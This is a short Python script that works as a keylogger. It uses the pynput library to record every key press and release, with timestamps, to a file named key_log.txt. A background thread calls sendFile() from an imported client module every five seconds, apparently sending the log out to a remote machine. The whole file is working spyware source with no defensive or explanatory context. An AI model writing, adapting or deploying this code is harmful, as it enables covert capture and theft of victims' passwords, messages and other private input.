import logging
import time
from pynput import keyboard
from client_p import sendFile
import threading

def RunSend():
    while(True):
        time.sleep(5)
        sendFile()


log_dir = "./"
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s, %(message)s')

def on_press(key):
    try:
        logging.info('pressed : {0}'.format(key.char))
    except AttributeError:
        logging.info('pressed : {0}'.format(key))

def on_release(key):
    logging.info('released : {0}'.format(key))

threading.Thread(target=RunSend).start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener :
    listener.join()
